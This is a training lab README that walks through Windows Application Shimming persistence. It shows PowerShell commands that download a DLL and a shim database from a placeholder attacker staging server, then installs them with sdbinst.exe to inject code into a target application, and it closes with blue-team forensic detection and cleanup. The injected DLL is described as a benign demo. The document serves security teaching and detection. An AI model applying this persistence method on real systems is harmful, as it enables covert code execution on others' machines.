![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# SDB-Explorer

# Windows VM

## The objective of this lab is to use Application Shimming (via the native sdbinst.exe utility) to silently inject a demonstration DLL into a custom 32-bit application, establishing persistent execution — and then use sdb-explorer to forensically expose the hidden attack.

---

### Documentation and Scenario

**What is Application Shimming?**

The Windows Application Compatibility framework — commonly called the **Shim Engine** — is a legitimate Microsoft technology designed to resolve software compatibility issues between older applications and newer versions of Windows. Instead of modifying application code directly, Windows can intercept specific API calls and transparently reroute them through a compatibility layer, or "shim."

Shims are defined inside **Shim Database files (.sdb)**, binary files installed system-wide using the native Windows utility **sdbinst.exe**. Once a shim is installed, it persists across reboots and applies automatically every time a targeted application is launched — silently, in the background, with no user awareness.

If you want to dive a bit deeper, check the [Windows Application Compatibility Documentation](https://docs.microsoft.com/en-us/windows/win32/devnotes/application-compatibility-database).

**Key Concepts:**

- *Shim Database (.sdb)* : A binary file that defines compatibility fixes targeting specific executable names. Once installed, it is stored in a protected system directory and registered in the Windows registry.

- *sdbinst.exe* : A native, Microsoft-signed Windows utility for installing and uninstalling Shim Databases. Because it is a trusted, pre-existing system binary, its execution is rarely flagged by antivirus software.

- *InjectDll Fix* : A powerful shim type that instructs the Windows Application Compatibility Engine to automatically load an arbitrary DLL into a target process's memory at launch time. This is the core mechanism attackers abuse for persistence.

- *sdb-explorer* : A forensic command-line tool capable of parsing and displaying the contents of Shim Database (.sdb) files in human-readable form, exposing hidden fixes, targeted executables, and injected DLL paths.

>[!NOTE]
> Application Shimming is a textbook **"Living off the Land" (LotL)** persistence technique. The attacker uses **sdbinst.exe** — a legitimate, Microsoft-signed binary that already exists on every Windows installation — to deploy their payload. To the operating system, the Windows Event Log, and most endpoint security tools, this action looks completely routine.

---

### **SCENARIO**

- In this lab, we simulate a targeted persistence attack using two machines on the same subnet. *The Ubuntu VM acts as the attacker's staging server*, while *the Windows VM represents a compromised corporate endpoint*.

- The attacker has already achieved initial access to the Windows machine. Their goal now is to **establish persistent access** that survives reboots and requires no further interaction — no re-exploitation, no active connection.

- To accomplish this, the attacker installs a custom **Shim Database (patch.sdb)** that abuses the Windows Application Compatibility framework. The shim targets **target.exe**, a 32-bit application present on the endpoint. The `InjectDll` fix is applied as a 32-bit shim, exploiting the WoW64 subsystem to execute reliably on modern 64-bit Windows builds where native 64-bit shimming is restricted.

- For educational and safety purposes, the injected DLL (**demo.dll**) performs benign proof-of-concept actions rather than a real payload: it displays a visible warning popup and writes an execution log to disk. In a real attack, this would be a reverse shell or a credential harvester.

>[!IMPORTANT]
> You will start on the **Windows VM**, but consider all commands typed into the **Ubuntu Shell** as actions performed by the attacker on their remote staging server.

---

### Phase 1: Setup and Objective (Windows)

Before starting the simulation, we need to initialize the lab workspace on the compromised endpoint.

1. Open a **PowerShell** terminal as **Administrator**.

<img width="519" height="396" alt="image" src="https://github.com/user-attachments/assets/93150de2-b86f-4dcb-80bc-1f6067846d71" />

2. Navigate to the lab directory and run the session initialisation script:

```powershell
cd Desktop\Labs\SdbExplorerLab
.\lab_start.ps1
```

Once you see the green **[✓]**, leave this Administrator terminal open — you will need it throughout the lab.

<img width="742" height="513" alt="image" src="https://github.com/user-attachments/assets/f5905648-a04b-413b-a59c-a27ccd045306" />

---

### Phase 2: Staging the Attack (Ubuntu)

As the attacker, your tools are pre-staged on the Ubuntu server. All you need to do is start a web server to make the payload files downloadable by the compromised endpoint.

- Open an **Ubuntu Shell** terminal:

<img width="388" height="489" alt="image" src="https://github.com/user-attachments/assets/4f75c43c-43ee-49f0-b23d-08eb146ab986" />

- Navigate to the **Lab Directory** and start a Python web server:

```bash
cd ~/BnB/SdbExplorer
python3 -m http.server 8001
```

<img width="607" height="167" alt="image" src="https://github.com/user-attachments/assets/d4a7fdaf-2617-4397-8adf-5a3ecb917bf1" />

>[!NOTE]
> Note down your **\<UBUNTU_IP\>** — you will need it in the next phase.

The Lab Directory contains four pre-staged files:

- **demo.dll** — a 32-bit demonstration payload that triggers a visible popup and writes an execution log to disk.
- **target.exe** — the 32-bit application that will be shimmed. It acts as the attacker's chosen persistence trigger on this endpoint.
- **patch.sdb** — a Shim Database pre-configured to inject `demo.dll` into `target.exe`.
- **sdb-explorer.exe** — the forensic analysis tool used in the Blue Team phase.

<img width="628" height="162" alt="image" src="https://github.com/user-attachments/assets/79acf40a-b082-41ce-a299-ca605a76855a" />

---

### Phase 3: Payload Delivery & Shim Installation (Windows)

Switch back to the compromised Windows machine. Using your Administrator PowerShell terminal, download the attack tools from the Ubuntu staging server and silently install the Shim.

- Download all four files. **Replace \<UBUNTU_IP\> with your actual Ubuntu IP address:**

```powershell
# Download the demonstration DLL to a plausible, user-writable location
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/demo.dll" -OutFile "C:\Users\Public\demo.dll"

# Download the target application to the same location
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/target.exe" -OutFile "C:\Users\Public\target.exe"

# Download the Shim Database to a temporary folder
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/patch.sdb" -OutFile "$env:TEMP\patch.sdb"

# Download the forensic tool (used in the Blue Team phase)
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/sdb-explorer.exe" -OutFile "C:\Users\Public\sdb-explorer.exe"
```

<img width="1492" height="65" alt="image" src="https://github.com/user-attachments/assets/088eb0b7-26ee-42af-b902-c31fbbe048ca" />

- Back in the Ubuntu terminal, you should now see four GET requests logged by the Python server — one for each downloaded file:

<img width="649" height="156" alt="image" src="https://github.com/user-attachments/assets/16763bc5-e763-42d8-904f-830f4f860f4e" />

- Now install the Shim Database using **sdbinst.exe** — a fully legitimate, Microsoft-signed Windows binary. This is the heart of the Living off the Land technique:

```powershell
sdbinst.exe "$env:TEMP\patch.sdb"
```

You will see a brief confirmation message. Silently and without any visible indication to a regular user, the OS has now been instructed to inject `demo.dll` into every future instance of `target.exe`.

<img width="898" height="100" alt="image" src="https://github.com/user-attachments/assets/ea0634fc-0046-409a-88c6-ed9631e4402b" />

>[!NOTE]
> **sdbinst.exe requires Administrator privileges.** In a real attack, this means the adversary must have already escalated their privileges before reaching this stage — a realistic assumption on a compromised corporate endpoint.

---

### Phase 4: Triggering the Persistence

The shim is now installed and armed. From this point forward, every time `target.exe` is launched — by any user, including after a reboot — the Application Compatibility Engine will silently load `demo.dll` into its memory before the application even starts.

- Open a **NEW, standard PowerShell terminal** (without Administrator privileges) and launch the target application:

```powershell
Start-Process C:\Users\Public\target.exe
```

Two things happen immediately and in sequence: first, `demo.dll` loads and displays a warning Message Box titled **"SdbExplorer Lab — Shim Active"** and writes a log to `C:\Windows\Temp\shimmed.log`. Then, after you dismiss that popup, `target.exe` itself opens its own window.

The injection order is the key observation: **demo.dll ran before the application's own code did**. The Application Compatibility Engine intercepted the process launch, injected the payload, and returned control to the application — all transparently, without the user's knowledge.

>[!IMPORTANT]
> Click **OK** on the demo.dll popup, but **leave target.exe open** — you will need the live process for the detection steps below.

---

### Phase 5: Blue Team Detection

Time to switch perspective. You are now a security analyst responding to an endpoint behavioural alert. You do not yet know what persistence mechanism was used — but you are about to uncover it forensically.

Switch back to your **Administrator PowerShell terminal**.

**Step 1 — Verify the Execution Artifact**

Inspect the log file written to disk during the trigger phase:

```powershell
Get-Content C:\Windows\Temp\shimmed.log
```

The log confirms that a DLL was injected into a running process through the Application Compatibility framework. This is your first indicator of compromise.

**Step 2 — Inspect Running Process Modules**

Examine the live `target.exe` process to see exactly which DLLs are currently loaded in its memory space:

```powershell
Get-Process target | Select-Object -ExpandProperty Modules | Where-Object { $_.FileName -like "*Users\Public*" }
```

You will see `C:\Users\Public\demo.dll` loaded inside the process. A DLL loaded from a user-writable public directory inside any application is a significant red flag — legitimate software does not do this.

**Step 3 — Check the AppCompat Registry for Installed Shims**

`sdbinst.exe` always writes entries to the Windows Registry when it installs a Shim Database. Let's look:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"
```

You will find a GUID-based entry referencing an installed `.sdb` file. The presence of an unrecognised custom Shim Database on a standard user workstation is a significant anomaly — IT-managed compatibility shims are rarely deployed this way.

**Step 4 — Locate the SDB File on Disk**

Shim Databases installed by `sdbinst.exe` are stored in protected system directories under cryptic GUID-based filenames, making them blend in with OS components:

```powershell
ls C:\Windows\apppatch\Custom\
ls C:\Windows\apppatch\Custom64\
```

You will find a `.sdb` file whose name matches the GUID registered in Step 3. This is the attacker's `patch.sdb` hiding in plain sight inside a Windows system folder.

**Step 5 — Expose the Attack with sdb-explorer**

Standard Windows tools cannot meaningfully read the binary contents of an SDB file — which is precisely what makes them such effective hiding spots. Point `sdb-explorer.exe` at the file you just found:

```powershell
$sdbFile = (Get-ChildItem C:\Windows\apppatch\Custom\ -Filter "*.sdb" | Select-Object -First 1).FullName
cd C:\Users\Public
.\sdb-explorer.exe $sdbFile
```

The tool parses the proprietary binary format and exposes its contents in human-readable form. You will see:

- **Targeted executable:** `target.exe`
- **Fix type applied:** `InjectDll`
- **Injected payload path:** `C:\Users\Public\demo.dll`

This is the smoking gun. A persistent system rule instructing Windows to silently load an arbitrary DLL into the target application on every single launch — surviving reboots, invisible to the user, installed using a signed Microsoft binary.

---

### Cleanup

Let's remove all lab artifacts and restore the endpoint to its original state.

- **On Ubuntu:** Press `CTRL+C` in the terminal to stop the Python web server. Close the terminal.

- **On Windows:** In your Administrator PowerShell, uninstall the Shim Database:

```powershell
sdbinst.exe -u "$env:TEMP\patch.sdb"
```

Remove all downloaded files and the execution log:

```powershell
Remove-Item "C:\Users\Public\demo.dll"         -Force
Remove-Item "C:\Users\Public\target.exe"       -Force
Remove-Item "C:\Users\Public\sdb-explorer.exe" -Force
Remove-Item "C:\Windows\Temp\shimmed.log"      -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\patch.sdb"              -Force
```

Close `target.exe` and all open terminal windows.

---

### Conclusion

In this lab, you completed a full persistence attack cycle built entirely on native Windows mechanics. An adversary with administrative access can silently install a Shim Database using a Microsoft-signed binary, causing any targeted application to execute unauthorised code on every launch — automatically, persistently across reboots, and with no further attacker interaction required. As a Blue Teamer, you learned to trace the forensic footprints left behind: an execution log dropped to disk, a foreign DLL loaded inside a running process, a suspicious GUID entry in the AppCompatFlags registry, and a hidden binary file inside a protected Windows folder. With sdb-explorer, you cut through the obfuscation of the binary SDB format and exposed exactly what the attacker had planted.

<br></br>

# Finished?

[Back to Card's Main Page]()
